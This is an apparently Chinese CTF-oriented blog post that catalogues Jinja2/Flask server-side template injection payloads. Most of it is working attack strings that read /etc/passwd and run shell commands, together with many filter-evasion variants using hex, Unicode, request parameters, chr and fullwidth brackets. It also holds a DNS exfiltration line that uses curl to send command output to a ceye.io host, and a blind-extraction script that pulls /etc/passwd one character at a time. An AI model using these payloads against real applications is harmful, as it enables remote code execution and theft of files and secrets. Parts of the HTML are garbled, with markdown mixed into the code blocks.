<p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/a9d24ae5c1bd41359cfba6666b1f6228.png" alt="img"></p>
<p>可以使用dir查看file对象中的内置方法</p>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
<pre><code>&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40])
[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__enter__&#39;, &#39;__exit__&#39;, &#39;__format__&#39;, &#39;__getattribute__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;close&#39;, &#39;closed&#39;, &#39;encoding&#39;, &#39;errors&#39;, &#39;fileno&#39;, &#39;flush&#39;, &#39;isatty&#39;, &#39;mode&#39;, &#39;name&#39;, &#39;newlines&#39;, &#39;next&#39;, &#39;read&#39;, &#39;readinto&#39;, &#39;readline&#39;, &#39;readlines&#39;, &#39;seek&#39;, &#39;softspace&#39;, &#39;tell&#39;, &#39;truncate&#39;, &#39;write&#39;, &#39;writelines&#39;, &#39;xreadlines&#39;]
</code></pre>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
<p>然后直接调用里面的方法即可，payload如下</p>
<p>读文件</p>
<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;

&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()&#125;&#125;
</code></pre>
<ul>
<li>warnings类中的linecache</li>
</ul>
<p>本方法只能用于python2，因为在python3中会报错’function object’ has no attribute ‘func_globals’，猜测应该是python3中func_globals被移除了还是啥的，如果不对请师傅们指出</p>
<p>我们把上面的find.py脚本中的search变量赋值为linecache，去寻找含有linecache的类</p>
<pre><code>λ python find.py
(&lt;class &#39;warnings.WarningMessage&#39;&gt;, 59)
(&lt;class &#39;warnings.catch_warnings&#39;&gt;, 60)
</code></pre>
<p>后面如法炮制，payload如下</p>
<pre><code>&#123;&#123;[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()&#125;&#125;
</code></pre>
<p><strong>python2&amp;3的方法</strong></p>
<p>这里介绍python2和python3两个版本通用的方法</p>
<ul>
<li>__builtins__代码执行</li>
</ul>
<p>这种方法是比较常用的，因为他两种python版本都适用</p>
<p>首先__builtins__是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__builtins__这类模块在Python启动时为我们导入了，可以使用dir(<strong>builtins</strong>)来查看调用方法的列表，然后可以发现__builtins__下有eval，__import__等的函数，因此可以利用此来执行命令。</p>
<p>把上面find.py脚本search变量赋值为__builtins__，然后找到第140个类warnings.catch_warnings含有他，而且这里的话比较多的类都含有__builtins__，比如常用的还有email.header._ValueFormatter等等，这也可能是为什么这种方法比较多人用的原因之一吧</p>
<p>再调用eval等函数和方法即可，payload如下</p>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;

&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;

&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;

&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;
</code></pre>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
<p>又或者用如下两种方式，用模板来跑循环</p>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
<pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;

&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__ == 'catch_warnings' %&#125;
  &#123;% for b in c.__init__.__globals__.values() %&#125;
  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
    &#123;% if 'eval' in b.keys() %&#125;
      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;
    &#123;% endif %&#125;
  &#123;% endif %&#125;
  &#123;% endfor %&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;
</code></pre>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428343034715.gif" alt="复制代码"></a></p>
<p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f45931bb692441b6b6040aa863eaf12c.png" alt="img"></p>
<p>读取文件payload</p>
<pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<p>另外一些绕过方法:</p>
<p><strong>绕过黑名单</strong></p>
<p>CTF中一般考的就是怎么绕过SSTI，我们学会如何去构造payload之后，还要学习如何去绕过一些过滤，然后下面由于环境的不同，payload中类的位置也是就那个数字可能会和文章中不一样，需要自己动手测一下</p>
<p><strong>过滤了点</strong></p>
<p>过滤了.</p>
<p>在python中，可用以下表示法可用于访问对象的属性</p>
<pre><code>&#123;&#123;().__class__&#125;&#125;
&#123;&#123;()["__class__"]&#125;&#125;
&#123;&#123;()|attr("__class__")&#125;&#125;
&#123;&#123;getattr('',"__class__")&#125;&#125;
</code></pre>
<p>也就是说我们可以通过[]，attr()，getattr()来绕过点</p>
<ul>
<li>使用[]绕过</li>
</ul>
<p>使用访问字典的方式来访问函数或者类等，下面两行是等价的</p>
<pre><code>&#123;&#123;().__class__&#125;&#125;
&#123;&#123;()['__class__']&#125;&#125;
</code></pre>
<p>以此，我们可以构造payload如下</p>
<pre><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()&#125;&#125;
</code></pre>
<ul>
<li>使用attr()绕过</li>
</ul>
<p>使用原生JinJa2的函数attr()，以下两行是等价的</p>
<pre><code>&#123;&#123;().__class__&#125;&#125;
&#123;&#123;()|attr('__class__')&#125;&#125;
</code></pre>
<p>以此，我们可以构造payload如下</p>
<pre><code>&#123;&#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')&#125;&#125;
</code></pre>
<ul>
<li>使用getattr()绕过</li>
</ul>
<p>这种方法有时候由于环境问题不一定可行，会报错’getattr’ is undefined，所以优先使用以上两种</p>
<pre><code>Python 3.7.8
&gt;&gt;&gt; ().__class__
&lt;class &#39;tuple&#39;&gt;
&gt;&gt;&gt; getattr((),&quot;__class__&quot;)
&lt;class &#39;tuple&#39;&gt;
</code></pre>
<p><strong>过滤引号</strong></p>
<p>过滤了’和”</p>
<ul>
<li>request绕过</li>
</ul>
<p>flask中存在着request内置对象可以得到请求的信息，request可以用5种不同的方式来请求信息，我们可以利用他来传递参数绕过</p>
<pre><code>request.args.name
request.cookies.name
request.headers.name
request.values.name
request.form.name
</code></pre>
<p>payload如下</p>
<p>GET方式，利用request.args传递参数</p>
<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd
</code></pre>
<p>POST方式，利用request.values传递参数</p>
<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;
post:arg1=open&amp;arg2=/etc/passwd
</code></pre>
<p>Cookie方式，利用request.cookies传递参数</p>
<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;
Cookie:arg1=open;arg2=/etc/passwd
</code></pre>
<p>剩下两种方法也差不多，这里就不赘述了</p>
<ul>
<li>chr绕过</li>
</ul>
<pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;
</code></pre>
<p>这里先爆破subclasses，获取subclasses中含有chr的类索引</p>
<p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/ce9a23785e014adda7f75ca7c05d5c33.jpeg" alt="img"></p>
<p>然后就可以用chr来绕过传参时所需要的引号，然后需要用chr来构造需要的字符</p>
<p>这里我写了个脚本可以快速构造想要的ascii字符</p>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
<pre><code>&lt;?php
$a = &#39;whoami&#39;;
$result = &#39;&#39;;
for($i=0;$i&lt;strlen($a);$i++)
&#123;
 $result .= &#39;chr(&#39;.ord($a[$i]).&#39;)%2b&#39;;
&#125;
echo substr($result,0,-3);
?&gt;
//chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)
</code></pre>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
<p>最后payload如下</p>
<pre><code>&#123;% set chr = ().__class__.__base__.__subclasses__()[7].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[257].__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()&#125;&#125;
</code></pre>
<p><strong>过滤下划线</strong></p>
<p>过滤了_</p>
<ul>
<li>编码绕过</li>
</ul>
<p>使用十六进制编码绕过，_编码后为\x5f，.编码后为\x2E</p>
<p>payload如下</p>
<pre><code>&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()&#125;&#125;
</code></pre>
<p>这里甚至可以全十六进制绕过，顺便把关键字也一起绕过，这里先给出个python脚本方便转换</p>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
<pre><code>string1=&quot;__class__&quot;
string2=&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;
def tohex(string):
  result = &quot;&quot;
  for i in range(len(string)):
      result=result+&quot;\\x&quot;+hex(ord(string[i]))[2:]
  print(result)

tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f
print(string2) #__class__
</code></pre>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
<p>随便构造个payload如下</p>
<pre><code>&#123;&#123;""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("whoami")["\x72\x65\x61\x64"]()&#125;&#125;
</code></pre>
<ul>
<li>request绕过</li>
</ul>
<p>在上面的过滤引号已经介绍过了，这里不再赘述</p>
<p><strong>过滤关键字</strong></p>
<p>首先要看关键字是如何被过滤的</p>
<p>如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过</p>
<p>如果直接ban了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下</p>
<ul>
<li>拼接字符绕过</li>
</ul>
<p>这里以过滤class为例子，用中括号括起来然后里面用引号连接，可以用+号或者不用</p>
<pre><code>&#123;&#123;()['__cla'+'ss__'].__bases__[0]&#125;&#125;
&#123;&#123;()['__cla''ss__'].__bases__[0]&#125;&#125;
</code></pre>
<p>随便写个payload如下</p>
<pre><code>&#123;&#123;()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")&#125;&#125;
</code></pre>
<p>或者可以使用join来进行拼接</p>
<pre><code>&#123;&#123;()|attr(["_"*2,"cla","ss","_"*2]|join)&#125;&#125;
</code></pre>
<p>看到有师傅甚至用管道符加上format方法来拼接的骚操作，也就是我们平时说的格式化字符串，其中的%s被l替换</p>
<pre><code>&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l
</code></pre>
<ul>
<li>使用使用str原生函数</li>
</ul>
<p>replace绕过，payload如下</p>
<pre><code>&#123;&#123;().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()&#125;&#125;
</code></pre>
<p>decode绕过，但这种方法经过测试只能在python2下使用，payload如下</p>
<pre><code>&#123;&#123;().__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;
</code></pre>
<ul>
<li>替代的方法</li>
</ul>
<p>过滤init，可以用__enter__或__exit__替代</p>
<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;

&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;
</code></pre>
<p>过滤config，我们通常会用获取当前设置，如果被过滤了可以使用以下的payload绕过</p>
<pre><code>&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;
&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;
</code></pre>
<p><strong>过滤中括号</strong></p>
<p>过滤了[和]</p>
<ul>
<li>数字中的中括号</li>
</ul>
<p>在python里面可以使用以下方法访问数组元素</p>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
<pre><code>Python 3.7.8
&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;][1]
&#39;kawhi&#39;
&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].pop(1)
&#39;kawhi&#39;
&gt;&gt;&gt; [&quot;a&quot;,&quot;kawhi&quot;,&quot;c&quot;].__getitem__(1)
&#39;kawhi&#39;
</code></pre>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
<p>也就是说可以使用__getitem__和pop替代中括号，取列表的第n位</p>
<p>payload如下</p>
<pre><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen('whoami').read()&#125;

&#123;&#123;().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen('whoami').read()&#125;&#125;
</code></pre>
<ul>
<li>魔术方法的中括号</li>
</ul>
<p>调用魔术方法本来是不用中括号的，但是如果过滤了关键字，要进行拼接的话就不可避免要用到中括号，像这里如果同时过滤了class和中括号</p>
<p>可用__getattribute__绕过</p>
<pre><code>&#123;&#123;"".__getattribute__("__cla"+"ss__").__base__&#125;&#125;
</code></pre>
<p>或者可以配合request一起使用</p>
<pre><code>&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1=__class__
</code></pre>
<p>payload如下</p>
<pre><code>&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami
</code></pre>
<p>这种同样是绕过关键字的方法之一</p>
<p><strong>过滤双大括号</strong></p>
<p>过滤了</p>
<ul>
<li>使用dns外带数据</li>
</ul>
<pre><code class="python">用&#123;%%&#125;替代了&#123;&#123;&#125;&#125;，使用判断语句进行dns外带数据
```

```
&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__['popen']("curl `whoami`.k1o75b.ceye.io").read()=='kawhi' %&#125;1&#123;% endif %&#125;
```

然后在ceye平台接收数据即可

![img](ssti-flak框架/a0b1acecc5844f778d857c94da232d74.jpeg)

- 盲注

如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上p0师傅的脚本

[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)

```
# -*- coding: utf-8 -*-
import requests

url = 'http://ip:5000/?name='

def check(payload):
    r = requests.get(url+payload).content
    return 'kawhi' in r

password  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`&#123;|&#125;~\'"_%'

for i in xrange(0,100):
    for c in s:
        payload = '&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open("/etc/passwd").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %&#125;kawhi&#123;% endif %&#125;'
        if check(payload):
            password += c
            break
    print password
```

[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)

- print标记

我们上面之所以要dnslog外带数据以及使用盲注，是因为用&#123;%%&#125;会没有回显，这里的话可以使用print来做一个标记使得他有回显，比如&#123;%print config%&#125;，payload如下

```
&#123;%print ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")%&#125;
```

**payload进阶与拓展**

这里我基于上面绕过黑名单各种方法的组合，对CTF中用到的一些方法和payload再做一个小的总结，不过其实一般来说，只要不是太偏太绕的题，上面的方法自行组合一下都够用了，下面只是作为一个拓展

**过滤_和.和'**

这里顺便给一个不常见的方法，主要是找到_frozen_importlib_external.FileLoader的get_data()方法，第一个是参数0，第二个为要读取的文件名，payload如下

```
&#123;&#123;().__class__.__bases__[0].__subclasses__()[222].get_data(0,"app.py")&#125;&#125;
```

使用十六进制绕过后，payload如下

```
&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[222]["get\x5Fdata"](0, "app\x2Epy")&#125;&#125;
```

**过滤args和.和_**

之前某二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了attr()绕过点，values绕过args，payload如下

[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)

```
&#123;&#123;()|attr(request['values']['x1'])|attr(request['values']['x2'])|attr(request['values']['x3'])()|attr(request['values']['x4'])(40)|attr(request['values']['x5'])|attr(request['values']['x6'])|attr(request['values']['x4'])(request['values']['x7'])|attr(request['values']['x4'])(request['values']['x8'])(request['values']['x9'])&#125;&#125;

post:x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('whoami').read()
```

[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)

**导入主函数读取变量**

有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把/flag文件加载到flag这个变量里面了

```
f = open('/flag','r')
flag = f.read()
```

我们就可以通过import是导入__main__主函数去读变量，payload如下

```
&#123;%print request.application.__globals__.__getitem__('__builtins__').__getitem__('__import__')('__main__').flag %&#125;
</=></code></pre>
<p><strong>Unicode绕过</strong></p>
<p>这种方法是从安洵杯2020 官方Writeup学到的，我们直奔主题看payload</p>
<pre><code>&#123;%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%&#125;
</code></pre>
<pre><code>这里的print绕过&#123;&#123;&#125;&#125;和attr绕过.上面已经说过了这里不赘述

然后这里的lipsum用&#123;&#123;lipsum&#125;&#125;测了一下发现是个方法

&lt;function generate_lorem_ipsum at 0x7fcddfa296a8&gt;
</code></pre>
<p>然后用他直接调用__globals__发现可以直接执行os命令，测了一下发现__builtins__也可以用，又学到了一种新方法，只能说师傅们tql</p>
<pre><code>&#123;&#123;lipsum.__globals__['os'].popen('whoami').read()&#125;&#125;
&#123;&#123;lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;
</code></pre>
<p>回到正题，这里使用了Unicode编码绕过关键字，下面两行是等价的</p>
<pre><code>&#123;&#123;()|attr("__class__")&#125;&#125;
&#123;&#123;()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")&#125;&#125;
</code></pre>
<p>知道了这两点之后，那个官方给的payload就很明朗了，解开编码后如下</p>
<pre><code>&#123;%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()%&#125;
</code></pre>
<p>然后我这里顺便给个Unicode互转的php脚本</p>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
<pre><code>&lt;?php
//字符串转Unicode编码
function unicode_encode($strLong) &#123;
  $strArr = preg_split(&#39;/(?&lt;!^)(?!$)/u&#39;, $strLong);//拆分字符串为数组(含中文字符)
  $resUnicode = &#39;&#39;;
  foreach ($strArr as $str)
  &#123;
      $bin_str = &#39;&#39;;
      $arr = is_array($str) ? $str : str_split($str);//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)
      foreach ($arr as $value)
      &#123;
          $bin_str .= decbin(ord($value));//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;
      &#125;
      $bin_str = preg_replace(&#39;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#39;, &#39;$1$2$3&#39;, $bin_str);//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;
      $unicode = dechex(bindec($bin_str));//返回unicode十六进制
      $_sup = &#39;&#39;;
      for ($i = 0; $i &lt; 4 - strlen($unicode); $i++)
      &#123;
          $_sup .= &#39;0&#39;;//补位高字节 0
      &#125;
      $str =  &#39;\\u&#39; . $_sup . $unicode; //加上 \u  返回
      $resUnicode .= $str;
  &#125;
  return $resUnicode;
&#125;
//Unicode编码转字符串方法1
function unicode_decode($name)
&#123;
  // 转换编码，将Unicode编码转换成可以浏览的utf-8编码
  $pattern = &#39;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#39;;
  preg_match_all($pattern, $name, $matches);
  if (!empty($matches))
  &#123;
    $name = &#39;&#39;;
    for ($j = 0; $j &lt; count($matches[0]); $j++)
    &#123;
      $str = $matches[0][$j];
      if (strpos($str, &#39;\\u&#39;) === 0)
      &#123;
        $code = base_convert(substr($str, 2, 2), 16, 10);
        $code2 = base_convert(substr($str, 4), 16, 10);
        $c = chr($code).chr($code2);
        $c = iconv(&#39;UCS-2&#39;, &#39;UTF-8&#39;, $c);
        $name .= $c;
      &#125;
      else
      &#123;
        $name .= $str;
      &#125;
    &#125;
  &#125;
  return $name;
&#125;
//Unicode编码转字符串
function unicode_decode2($str)&#123;
  $json = &#39;&#123;&quot;str&quot;:&quot;&#39; . $str . &#39;&quot;&#125;&#39;;
  $arr = json_decode($json, true);
  if (empty($arr)) return &#39;&#39;;
  return $arr[&#39;str&#39;];
&#125;
echo unicode_encode(&#39;__class__&#39;);
echo unicode_decode(&#39;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#39;);
//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__
</code></pre>
<p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-163428445508020.gif" alt="复制代码"></a></p>
<h1 id="魔改字符"><a href="#魔改字符" class="headerlink" title="魔改字符"></a><strong>魔改字符</strong></h1><pre><code>这种方法是在太湖杯easyWeb这道题目学到的，上面所说的过滤双大括号，在一些特定的题目可以魔改&#123;&#123;&#125;&#125;，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法
```

![img](ssti-flak框架/99b07c77bc934233b53852378b18075d.jpeg)

可以在Unicode字符网站寻找绕过的字符，直接在网址搜索&#123;，就会出现类似的字符，就可以找到︷和︸了，网址：https://www.compart.com/en/unicode/U+FE38

payload如下

```
︷︷config︸︸
%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B8
```

还可以使用中文的字符魔改

[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)

```
｛ &#65371;
｝ &#65373;
［ &#65339;
］ &#65341;
＇ &#65287;
＂ &#65282;

payload如下

｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat /flag＂）.read（）＇）｝｝ 

总结
```

[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)



----------

做题思路：

首先找到漏洞存在点。

```
&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;
</code></pre>
<p>通过这个输出所有类。</p>
<p>在子类列表中找到可以getshell的类/记住一些常见的可以getshell的函数。</p>
<p>1、有popen()的类</p>
<pre><code>os._wrap_close
payload:
&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;
</code></pre>
<p>2、有os模块的</p>
<p>socket._socketobject（一般在71）、site._Printer等模块</p>
<pre><code>payload:
&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;
</code></pre>
<p>3、有builtins的类</p>
<p>__ builtins __代码执行（最常用的方法）</p>
<p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p>
<p>__ builtins __ 是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__ builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p>
<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;

&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;

&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;

&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;
</code></pre>
<p>模板跑循环</p>
<pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;

&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__ == 'catch_warnings' %&#125;
  &#123;% for b in c.__init__.__globals__.values() %&#125;
  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
    &#123;% if 'eval' in b.keys() %&#125;
      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;
    &#123;% endif %&#125;
  &#123;% endif %&#125;
  &#123;% endfor %&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;
</code></pre>
<p>读取文件payload</p>
<pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<p>warnings.catch_warnings类在在内部定义了_module=sys.modules[‘warnings’]，然后warnings模块包含有__builtins__，也就是说如果可以找到warnings.catch_warnings类，则可以不使用globals，payload如下</p>
<pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()&#125;&#125;
</code></pre>
<p>总而言之，原理都是先找到含有__builtins__的类，然后再进一步利用</p>
<p>常用脚本：</p>
<p>我们首先把所有的子类列举出来</p>
